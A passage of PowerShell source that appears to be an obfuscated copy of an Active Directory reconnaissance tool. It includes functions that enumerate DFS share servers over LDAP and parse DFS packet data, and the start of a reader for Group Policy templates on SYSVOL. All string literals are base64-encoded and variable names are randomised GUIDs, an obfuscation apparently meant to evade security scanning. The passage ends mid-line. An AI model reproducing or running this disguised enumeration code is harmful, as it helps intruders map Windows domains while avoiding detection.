('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function 
Parse-Pkt {
            [CmdletBinding()]
            Param(
           
     [Byte[]]
                $Pkt
            )
            
${0b70b45d8ec14381b0bb543ebb5c44a1} = $Pkt
            
${bd3b9db5dbdb481d9b8d56dec77861b7} = [bitconverter]::ToUInt32
(${0b70b45d8ec14381b0bb543ebb5c44a1}[0..3],0)
            
${ecaba1e975164c3a86e1e9c22d130693} = [bitconverter]::ToUInt32
(${0b70b45d8ec14381b0bb543ebb5c44a1}[4..7],0)
            $offset = 
8
            ${3c4b202a0552461ebf0fc52f01d2e22b} = @()
            
for(${9e5bb180fda8451b8ec7f5d4ed0667a4}=1; 
${9e5bb180fda8451b8ec7f5d4ed0667a4} -le 
${ecaba1e975164c3a86e1e9c22d130693}; 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++){
                
${b65441b0429849f39f2d4b4288f03b32} = $offset
                
${0650d10ec14c425d9afa170cdca7e4f5} = $offset + 1
                
${c492e62c9464451ea9accb1e1d2288e3} = [bitconverter]::ToUInt16
(${0b70b45d8ec14381b0bb543ebb5c44a1}
[${b65441b0429849f39f2d4b4288f03b32}..
${0650d10ec14c425d9afa170cdca7e4f5}],0)
                
${65bf191679ec406a9c03eab2585f5258} = 
${0650d10ec14c425d9afa170cdca7e4f5} + 1
                
${cbae985564d54130829dffcc5ab6aedd} = 
${65bf191679ec406a9c03eab2585f5258} + 
${c492e62c9464451ea9accb1e1d2288e3} - 1
                
${c99f6bc2b2df491e914ea0b227a9360a} = 
[System.Text.Encoding]::Unicode.GetString
(${0b70b45d8ec14381b0bb543ebb5c44a1}
[${65bf191679ec406a9c03eab2585f5258}..
${cbae985564d54130829dffcc5ab6aedd}])
                
${e5fa4abe5b5a4c90878c3573faf9f06b} = 
${cbae985564d54130829dffcc5ab6aedd} + 1
                
${78222865bece40c5a5323d41a05dcc27} = 
${e5fa4abe5b5a4c90878c3573faf9f06b} + 3
                
${f2c480d82bc749f196660558d569a3a4} = [bitconverter]::ToUInt32
(${0b70b45d8ec14381b0bb543ebb5c44a1}
[${e5fa4abe5b5a4c90878c3573faf9f06b}..
${78222865bece40c5a5323d41a05dcc27}],0)
                
${6f8f937f157a4c35aad7bbb320f408e7} = 
${78222865bece40c5a5323d41a05dcc27} + 1
                
${54ffdce47210445da54b91bf0630db12} = 
${6f8f937f157a4c35aad7bbb320f408e7} + 
${f2c480d82bc749f196660558d569a3a4} - 1
                
${598b6aed000b471ab8c20a802b502765} = 
${0b70b45d8ec14381b0bb543ebb5c44a1}
[${6f8f937f157a4c35aad7bbb320f408e7}..
${54ffdce47210445da54b91bf0630db12}]
                switch -wildcard 
(${c99f6bc2b2df491e914ea0b227a9360a}) {
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        
${146af61a6de5417d9fb92177ec0cca15} = 0
                        
${48fb5f314c314447a4b88048acf07d91} = 15
                        
${e47d9947c02045878698b9162246306f} = [byte
[]]${598b6aed000b471ab8c20a802b502765}
[${146af61a6de5417d9fb92177ec0cca15}..
${48fb5f314c314447a4b88048acf07d91}]
                        
${536c95c6ac344afbad492821cdfaf6d0} = New-Object Guid(,
${e47d9947c02045878698b9162246306f}) 
                        
${161c08f7c1744ca1ad5e9ad7784d6476} = 
${48fb5f314c314447a4b88048acf07d91} + 1
                        
${fa36dc91b7724cac9ea6af3b1d1507fc} = 
${161c08f7c1744ca1ad5e9ad7784d6476} + 1
                        
${7a76b3cfefa04a1fbfc2bef5fd135a1f} = [bitconverter]::ToUInt16
(${598b6aed000b471ab8c20a802b502765}
[${161c08f7c1744ca1ad5e9ad7784d6476}..
${fa36dc91b7724cac9ea6af3b1d1507fc}],0)
                        
${781ee640ed1d4f05b86db2d3a6c1109a} = 
${fa36dc91b7724cac9ea6af3b1d1507fc} + 1
                        
${e4386df7dffd4ea3ab253a5a70792b4c} = 
${781ee640ed1d4f05b86db2d3a6c1109a} + 
${7a76b3cfefa04a1fbfc2bef5fd135a1f} - 1
                        
${6bdc45df7b5346eaa2de8094520974e5} = 
[System.Text.Encoding]::Unicode.GetString
(${598b6aed000b471ab8c20a802b502765}
[${781ee640ed1d4f05b86db2d3a6c1109a}..
${e4386df7dffd4ea3ab253a5a70792b4c}])
                        
${c9366deeb20a4242ac481bdae50c9598} = 
${e4386df7dffd4ea3ab253a5a70792b4c} + 1
                        
${9bed22a843f74dac9a18aa499581e521} = 
${c9366deeb20a4242ac481bdae50c9598} + 1
                        
${3792428351fd43e5a4ec989729a67add} = [bitconverter]::ToUInt16
(${598b6aed000b471ab8c20a802b502765}
[${c9366deeb20a4242ac481bdae50c9598}..
${9bed22a843f74dac9a18aa499581e521}],0)
                        
${32944bf34d1c498a8ff5208bc82a9d01} = 
${9bed22a843f74dac9a18aa499581e521} + 1
                        
${328482f6fb784c32aabec9e41c3f6539} = 
${32944bf34d1c498a8ff5208bc82a9d01} + 
${3792428351fd43e5a4ec989729a67add} - 1
                        
${b0b5e48c35cb43a4a35ca8e0c5b361da} = 
[System.Text.Encoding]::Unicode.GetString
(${598b6aed000b471ab8c20a802b502765}
[${32944bf34d1c498a8ff5208bc82a9d01}..
${328482f6fb784c32aabec9e41c3f6539}])
                        
${470027e378ab4160b3939aa77375ff96} = 
${328482f6fb784c32aabec9e41c3f6539} + 1
                        
${3aea76d730534c319d7ec3875711c0fe} = 
${470027e378ab4160b3939aa77375ff96} + 3
                        $type 
= [bitconverter]::ToUInt32(${598b6aed000b471ab8c20a802b502765}
[${470027e378ab4160b3939aa77375ff96}..
${3aea76d730534c319d7ec3875711c0fe}],0)
                        
${d8b23ba40e304fa3aa355576f313a328} = 
${3aea76d730534c319d7ec3875711c0fe} + 1
                        
${c73f41dc3ae04eb59b9c0b6827913ae6} = 
${d8b23ba40e304fa3aa355576f313a328} + 3
                        
${eaf33e41d6284937823fa1644657137a} = [bitconverter]::ToUInt32
(${598b6aed000b471ab8c20a802b502765}
[${d8b23ba40e304fa3aa355576f313a328}..
${c73f41dc3ae04eb59b9c0b6827913ae6}],0)
                        
${26c17c16a96e4167b80b1f8a939d1643} = 
${c73f41dc3ae04eb59b9c0b6827913ae6} + 1
                        
${92fd0de543644d93a110c8ca89f5ad55} = 
${26c17c16a96e4167b80b1f8a939d1643} + 1
                        
${b4c8dc38fc0b46e5bbb3f02cf7f09494} = [bitconverter]::ToUInt16
(${598b6aed000b471ab8c20a802b502765}
[${26c17c16a96e4167b80b1f8a939d1643}..
${92fd0de543644d93a110c8ca89f5ad55}],0)
                        
${72447d017f734f12afc6bf199b9617e5} = 
${92fd0de543644d93a110c8ca89f5ad55} + 1
                        
${0fd2c3a0cd4e4892bf7d37d730d1af70} = 
${72447d017f734f12afc6bf199b9617e5} + 
${b4c8dc38fc0b46e5bbb3f02cf7f09494} - 1
                        if 
(${b4c8dc38fc0b46e5bbb3f02cf7f09494} -gt 0)  {
                       
     ${cbb674b96f1849aea22a9f7f12f432f0} = 
[System.Text.Encoding]::Unicode.GetString
(${598b6aed000b471ab8c20a802b502765}
[${72447d017f734f12afc6bf199b9617e5}..
${0fd2c3a0cd4e4892bf7d37d730d1af70}])
                        }
       
                 ${d211260d091345f390b8336bae4787ef} = 
${0fd2c3a0cd4e4892bf7d37d730d1af70} + 1
                        
${a8f49060277e46f9bb73c7014be413a4} = 
${d211260d091345f390b8336bae4787ef} + 7
                        
${9a0a0605e0a0439c94dc96e58b3d42e8} = 
${598b6aed000b471ab8c20a802b502765}
[${d211260d091345f390b8336bae4787ef}..
${a8f49060277e46f9bb73c7014be413a4}] 
                        
${120a752755774cf7bde75c3d4da4241c} = 
${a8f49060277e46f9bb73c7014be413a4} + 1
                        
${ee6af9cf9bb24282a4433cc8c6826b44} = 
${120a752755774cf7bde75c3d4da4241c} + 7
                        
${c46e99883d9e413b96e6da911c240e6d} = 
${598b6aed000b471ab8c20a802b502765}
[${120a752755774cf7bde75c3d4da4241c}..
${ee6af9cf9bb24282a4433cc8c6826b44}]
                        
${9f743cf752814fee9d61f54b2582eedc} = 
${ee6af9cf9bb24282a4433cc8c6826b44} + 1
                        
${ded56301a7674b08aeea36dd0ca64b5d} = 
${9f743cf752814fee9d61f54b2582eedc} + 7
                        
${cd44a0c36e7c4083bce07ce981d63828} = 
${598b6aed000b471ab8c20a802b502765}
[${9f743cf752814fee9d61f54b2582eedc}..
${ded56301a7674b08aeea36dd0ca64b5d}]
                        
${44c99230e60a484388ce7880034dd673} = 
${ded56301a7674b08aeea36dd0ca64b5d}  + 1
                        
${73eff1404a1c4b2698adefdb5b5a7ea9} = 
${44c99230e60a484388ce7880034dd673} + 3
                        
$version = [bitconverter]::ToUInt32
(${598b6aed000b471ab8c20a802b502765}
[${44c99230e60a484388ce7880034dd673}..
${73eff1404a1c4b2698adefdb5b5a7ea9}],0)
                        
${3a1daf2009d94811b516b563f1c1d76a} = 
${73eff1404a1c4b2698adefdb5b5a7ea9} + 1
                        
${23b0435ecfdb46a49d6ce99cb90769d3} = 
${3a1daf2009d94811b516b563f1c1d76a} + 3
                        
${e4c7d27fe5ad429c81a9ddedb5a6fd37} = [bitconverter]::ToUInt32
(${598b6aed000b471ab8c20a802b502765}
[${3a1daf2009d94811b516b563f1c1d76a}..
${23b0435ecfdb46a49d6ce99cb90769d3}],0)
                        
${4846c84f71f744dab6d37b3a97cd7605} = 
${23b0435ecfdb46a49d6ce99cb90769d3} + 1
                        
${8750571541344198ae61612d8658c3d4} = 
${4846c84f71f744dab6d37b3a97cd7605} + 
${e4c7d27fe5ad429c81a9ddedb5a6fd37} - 1
                        
${07ca5cab7b954c3d82736ab2b450df6d} = 
${598b6aed000b471ab8c20a802b502765}
[${4846c84f71f744dab6d37b3a97cd7605}..
${8750571541344198ae61612d8658c3d4}]
                        
${eece68f9d5fb4753ada5897a71e9e3c8} = 
${8750571541344198ae61612d8658c3d4} + 1
                        
${998558ff3936454da9f64fcd0d002831} = 
${eece68f9d5fb4753ada5897a71e9e3c8} + 3
                        
${8d227537e55048ecbddbfe0a0cf86532} = [bitconverter]::ToUInt32
(${598b6aed000b471ab8c20a802b502765}
[${eece68f9d5fb4753ada5897a71e9e3c8}..
${998558ff3936454da9f64fcd0d002831}],0)
                        
${cd843de744c149d294350a22cf20488b} = 
${998558ff3936454da9f64fcd0d002831} + 1
                        
${17da44e91e6b473ea4fe5aa096ca1d01} = 
${cd843de744c149d294350a22cf20488b} + 
${8d227537e55048ecbddbfe0a0cf86532} - 1
                        
${b4a19852f63c4601b65eff20573e67db} = 
${598b6aed000b471ab8c20a802b502765}
[${cd843de744c149d294350a22cf20488b}..
${17da44e91e6b473ea4fe5aa096ca1d01}]
                        
${971515af0a1647c7b4e99f5402466c99} = 
${17da44e91e6b473ea4fe5aa096ca1d01} + 1
                        
${3333d25ebdf648a28a1c2ccca5fc79ac} = 
${971515af0a1647c7b4e99f5402466c99} + 3
                        
${3fd6b1024f6f472ba772ac790e09099b} = [bitconverter]::ToUInt32
(${598b6aed000b471ab8c20a802b502765}
[${971515af0a1647c7b4e99f5402466c99}..
${3333d25ebdf648a28a1c2ccca5fc79ac}],0)
                        
${48b2d042280f45569b201f0d14abbb22} = 0
                        
${d9e35d79dcd746e294d77ae318248dc7} = 
${48b2d042280f45569b201f0d14abbb22} + 3
                        
${364c4802433747878e1688fcdf802cf1} = [bitconverter]::ToUInt32
(${07ca5cab7b954c3d82736ab2b450df6d}
[${48b2d042280f45569b201f0d14abbb22}..
${d9e35d79dcd746e294d77ae318248dc7}],0)
                        
${b43b4a80e5324e7f86df05e890e126fa} = 
${d9e35d79dcd746e294d77ae318248dc7} + 1
                        for
(${9c6b6106d10747338c656ee9b7543485}=1; 
${9c6b6106d10747338c656ee9b7543485} -le 
${364c4802433747878e1688fcdf802cf1}; 
${9c6b6106d10747338c656ee9b7543485}++){
                            
${24667a142bda4e72ac1ed982fca79c03} = 
${b43b4a80e5324e7f86df05e890e126fa}
                            
${6b655b3b0c7f4a858e36c638807af416} = 
${24667a142bda4e72ac1ed982fca79c03} + 3
                            
${04a0228ddb484e84827eb7ebf80b9a31} = [bitconverter]::ToUInt32
(${07ca5cab7b954c3d82736ab2b450df6d}
[${24667a142bda4e72ac1ed982fca79c03}..
${6b655b3b0c7f4a858e36c638807af416}],0)
                            
${8370d49fed974b3591e260313231631a} = 
${6b655b3b0c7f4a858e36c638807af416} + 1
                            
${41df1a68db0f408f9274bca91579d264} = 
${8370d49fed974b3591e260313231631a} + 7
                            
${9f6dff4c776c464686f55b31175cb1f6} = 
${07ca5cab7b954c3d82736ab2b450df6d}
[${8370d49fed974b3591e260313231631a}..
${41df1a68db0f408f9274bca91579d264}]
                            
${4dae61a2a1f1442eab93d3ccef1f21ae} = 
${41df1a68db0f408f9274bca91579d264} + 1
                            
${0b03c12ffaff489188617cf00f31b914} = 
${4dae61a2a1f1442eab93d3ccef1f21ae} + 3
                            
${44f22e439518462683f718831130182b} = [bitconverter]::ToUInt32
(${07ca5cab7b954c3d82736ab2b450df6d}
[${4dae61a2a1f1442eab93d3ccef1f21ae}..
${0b03c12ffaff489188617cf00f31b914}],0)
                            
${6bc5ddd1eec841b0880dd386e45516ec} = 
${0b03c12ffaff489188617cf00f31b914} + 1
                            
${a6519b7a2d0b4ff2bf63ee3079cd9dab} = 
${6bc5ddd1eec841b0880dd386e45516ec} + 3
                            
${cf26ce2cc6d941879eea99a0390a12e0} = [bitconverter]::ToUInt32
(${07ca5cab7b954c3d82736ab2b450df6d}
[${6bc5ddd1eec841b0880dd386e45516ec}..
${a6519b7a2d0b4ff2bf63ee3079cd9dab}],0)
                            
${b3a2564b0de744199cc1d63eea1f8d52} = 
${a6519b7a2d0b4ff2bf63ee3079cd9dab} + 1
                            
${ee3084655288468cbfbf9c973f335503} = 
${b3a2564b0de744199cc1d63eea1f8d52} + 1
                            
${a7a37092bca94eceaaabc646dbbd1df9} = [bitconverter]::ToUInt16
(${07ca5cab7b954c3d82736ab2b450df6d}
[${b3a2564b0de744199cc1d63eea1f8d52}..
${ee3084655288468cbfbf9c973f335503}],0)
                            
${3c8adcb82ef647ee8660b186d8af4e8b} = 
${ee3084655288468cbfbf9c973f335503} + 1
                            
${d96e63226474492581a1601dc0268d6b} = 
${3c8adcb82ef647ee8660b186d8af4e8b} + 
${a7a37092bca94eceaaabc646dbbd1df9} - 1
                            
${3feda3f6f4aa40019131b2f6f44012ed} = 
[System.Text.Encoding]::Unicode.GetString
(${07ca5cab7b954c3d82736ab2b450df6d}
[${3c8adcb82ef647ee8660b186d8af4e8b}..
${d96e63226474492581a1601dc0268d6b}])
                            
${aac70930c6444548aa4b86078ba11b6d} = 
${d96e63226474492581a1601dc0268d6b} + 1
                            
${9c23f0b91b094d0c8bf75bb9fe81364b} = 
${aac70930c6444548aa4b86078ba11b6d} + 1
                            
${a7b61229fe0a4fd29557397f172718f8} = [bitconverter]::ToUInt16
(${07ca5cab7b954c3d82736ab2b450df6d}
[${aac70930c6444548aa4b86078ba11b6d}..
${9c23f0b91b094d0c8bf75bb9fe81364b}],0)
                            
${98344fcbd4174ec8bf0db8cb9902e1f0} = 
${9c23f0b91b094d0c8bf75bb9fe81364b} + 1
                            
${d01f39e8e30e4987a572145f34d76092} = 
${98344fcbd4174ec8bf0db8cb9902e1f0} + 
${a7b61229fe0a4fd29557397f172718f8} - 1
                            
${19ff1cd19505410cb546f8b8b6c4fd1d} = 
[System.Text.Encoding]::Unicode.GetString
(${07ca5cab7b954c3d82736ab2b450df6d}
[${98344fcbd4174ec8bf0db8cb9902e1f0}..
${d01f39e8e30e4987a572145f34d76092}])
                            
${5eae719baff34d6998710aa2e8d52ab5} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcACQAewAzAGYAZQBkAGEAMwBmADYAZgA0AGEAYQA0ADAAMAAxADkAMQAzADEAYg
AyAGYANgBmADQANAAwADEAMgBlAGQAfQBcACQAewAxADkAZgBmADEAYwBkADEAOQA1AD
AANQA0ADEAMABjAGIANQA0ADYAZgA4AGIAOABiADYAYwA0AGYAZAAxAGQAfQA=')))
   
                         ${b43b4a80e5324e7f86df05e890e126fa} = 
${d01f39e8e30e4987a572145f34d76092} + 1
                        }
     
               }
                }
                $offset = 
${54ffdce47210445da54b91bf0630db12} + 1
                
${04006b7c948e4ce4954cbdcfd7f147eb} = @{
                    'Name' = 
${c99f6bc2b2df491e914ea0b227a9360a}
                    'Prefix' = 
${6bdc45df7b5346eaa2de8094520974e5}
                    'TargetList' 
= ${5eae719baff34d6998710aa2e8d52ab5}
                }
               
 ${3c4b202a0552461ebf0fc52f01d2e22b} += New-Object -TypeName 
PSObject -Property ${04006b7c948e4ce4954cbdcfd7f147eb}
               
 ${6bdc45df7b5346eaa2de8094520974e5} = $Null
                
${c99f6bc2b2df491e914ea0b227a9360a} = $Null
                
${5eae719baff34d6998710aa2e8d52ab5} = $Null
            }
            
${3c470d7bd44d4599839d2bb8e01cf7db} = @()
            
${3c4b202a0552461ebf0fc52f01d2e22b} | ForEach-Object {
               
 if ($_.TargetList) {
                    $_.TargetList | ForEach-
Object {
                        ${3c470d7bd44d4599839d2bb8e01cf7db} 
+= $_.split('\')[2]
                    }
                }
            
}
            ${3c470d7bd44d4599839d2bb8e01cf7db}
        }
        
function Get-DomainDFSShareV1 {
            [CmdletBinding()]
         
   Param(
                [String]
                $Domain,
            
    [String]
                $SearchBase,
                [String]
     
           $Server,
                [String]
                
$SearchScope = 'Subtree',
                [Int]
                
$ResultPageSize = 200,
                [Int]
                
$ServerTimeLimit,
                [Switch]
                
$Tombstone,
                [Management.Automation.PSCredential]
      
          [Management.Automation.CredentialAttribute()]
              
  $Credential = [Management.Automation.PSCredential]::Empty
          
  )
            ${8d2bff2adfab4f85abff442569ea8788} = Get-
DomainSearcher @PSBoundParameters
            if 
(${8d2bff2adfab4f85abff442569ea8788}) {
                
${454bbbfcd8a243dfb3bcdede99d24965} = @()
                
${8d2bff2adfab4f85abff442569ea8788}.filter = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
   
             try {
                    
${9f78951ba80c437e9db41515f07bc24e} = 
${8d2bff2adfab4f85abff442569ea8788}.FindAll()
                    
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                        $Properties = $_.Properties
          
              ${349f7bce798347518a7f5626594a578b} = 
$Properties.remoteservername
                        $Pkt = 
$Properties.pkt
                        
${454bbbfcd8a243dfb3bcdede99d24965} += 
${349f7bce798347518a7f5626594a578b} | ForEach-Object {
               
             try {
                                if ( $_.Contains
('\') ) {
                                    New-Object -TypeName 
PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=
$_.split('\')[2]}
                                }
                   
         }
                            catch {
                        
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQ
BEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAaQBuAC
AAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
   
                         }
                        }
                  
  }
                    if (${9f78951ba80c437e9db41515f07bc24e}) {
    
                    try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                      
  catch {
                            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQ
BEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAZABpAH
MAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAag
BlAGMAdAA6ACAAJABfAA==')))
                        }
                  
  }
                    ${8d2bff2adfab4f85abff442569ea8788}.dispose
()
                    if ($pkt -and $pkt[0]) {
                       
 Parse-Pkt $pkt[0] | ForEach-Object {
                            if 
($_ -ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                    
            New-Object -TypeName PSObject -Property @{'Name'=
$Properties.name[0];'RemoteServerName'=$_}
                           
 }
                        }
                    }
                }
    
            catch {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQ
BEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgAC
QAXwA=')))
                }
                
${454bbbfcd8a243dfb3bcdede99d24965} | Sort-Object -Unique -Property 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
      
  }
        function Get-DomainDFSShareV2 {
            
[CmdletBinding()]
            Param(
                [String]
          
      $Domain,
                [String]
                $SearchBase,
   
             [String]
                $Server,
                
[String]
                $SearchScope = 'Subtree',
                
[Int]
                $ResultPageSize = 200,
                [Int]
     
           $ServerTimeLimit,
                [Switch]
                
$Tombstone,
                [Management.Automation.PSCredential]
      
          [Management.Automation.CredentialAttribute()]
              
  $Credential = [Management.Automation.PSCredential]::Empty
          
  )
            ${8d2bff2adfab4f85abff442569ea8788} = Get-
DomainSearcher @PSBoundParameters
            if 
(${8d2bff2adfab4f85abff442569ea8788}) {
                
${454bbbfcd8a243dfb3bcdede99d24965} = @()
                
${8d2bff2adfab4f85abff442569ea8788}.filter = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4Aaw
B2ADIAKQApAA==')))
                $Null = 
${8d2bff2adfab4f85abff442569ea8788}.PropertiesToLoad.AddRange
(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
             
   try {
                    ${9f78951ba80c437e9db41515f07bc24e} = 
${8d2bff2adfab4f85abff442569ea8788}.FindAll()
                    
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                        $Properties = $_.Properties
          
              ${5eae719baff34d6998710aa2e8d52ab5} = 
$Properties.'msdfs-targetlistv2'[0]
                        
${756182223b0f44aca5ee3888b03eb011} = [xml]
[System.Text.Encoding]::Unicode.GetString
(${5eae719baff34d6998710aa2e8d52ab5}[2..
(${5eae719baff34d6998710aa2e8d52ab5}.Length-1)])
                     
   ${454bbbfcd8a243dfb3bcdede99d24965} += 
${756182223b0f44aca5ee3888b03eb011}.targets.ChildNodes | ForEach-
Object {
                            try {
                            
    ${6233fa87d56446ee94200db67a8ad3dc} = $_.InnerText
               
                 if ( ${6233fa87d56446ee94200db67a8ad3dc}.Contains
('\') ) {
                                    
${7633766df8c24575b59e78262b5b3c34} = 
${6233fa87d56446ee94200db67a8ad3dc}.split('\')[3]
                    
                ${619c43be14474b1289036082e97a9d85} = 
$Properties.'msdfs-linkpathv2'[0]
                                    
New-Object -TypeName PSObject -Property @{'Name'=
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADcANgAzADMANwA2ADYAZABmADgAYwAyADQANQA3ADUAYgA1ADkAZQA3ADgAMg
A2ADIAYgA1AGIAMwBjADMANAB9ACQAewA2ADEAOQBjADQAMwBiAGUAMQA0ADQANwA0AG
IAMQAyADgAOQAwADMANgAwADgAMgBlADkANwBhADkAZAA4ADUAfQA=')));'RemoteSe
rverName'=${6233fa87d56446ee94200db67a8ad3dc}.split('\')[2]}
         
                       }
                            }
                
            catch {
                                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQ
BEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAaQBuAC
AAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
           
                 }
                        }
                    }
     
               if (${9f78951ba80c437e9db41515f07bc24e}) {
            
            try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
    
                    catch {
                            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbw
ByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AH
MAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
      
              }
                    
${8d2bff2adfab4f85abff442569ea8788}.dispose()
                }
       
         catch {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQ
BEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgAC
QAXwA=')))
                }
                
${454bbbfcd8a243dfb3bcdede99d24965} | Sort-Object -Unique -Property 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
      
  }
    }
    PROCESS {
        ${454bbbfcd8a243dfb3bcdede99d24965} = 
@()
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in 
$Domain) {
                ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version 
-match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                
    ${454bbbfcd8a243dfb3bcdede99d24965} += Get-DomainDFSShareV1 
@ea43c787582f45539b7f519da4680c7a
                }
                if 
($Version -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                
    ${454bbbfcd8a243dfb3bcdede99d24965} += Get-DomainDFSShareV2 
@ea43c787582f45539b7f519da4680c7a
                }
            }
      
  }
        else {
            if ($Version -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBsAGwAfAAxAA==')))) {
                
${454bbbfcd8a243dfb3bcdede99d24965} += Get-DomainDFSShareV1 
@ea43c787582f45539b7f519da4680c7a
            }
            if 
($Version -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                
${454bbbfcd8a243dfb3bcdede99d24965} += Get-DomainDFSShareV2 
@ea43c787582f45539b7f519da4680c7a
            }
        }
        
${454bbbfcd8a243dfb3bcdede99d24965} | Sort-Object -Property 
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBhAG0AZQA=')))) -Unique
    }
}
function Get-GptTmpl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    
[CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
     
   $GptTmplPath,
        [Switch]
        $OutputObject,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${6ff55a488453497ca90f5967d10128a7} = @{}
    }
    PROCESS {
        
try {
            if (($GptTmplPath -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                
${a1860b7049e841f1b625f2c14fda5cb8} = "\\$((New-Object System.Uri
($GptTmplPath)).Host)\SYSVOL"
                if (-not 
${6ff55a488453497ca90f5967d10128a7}
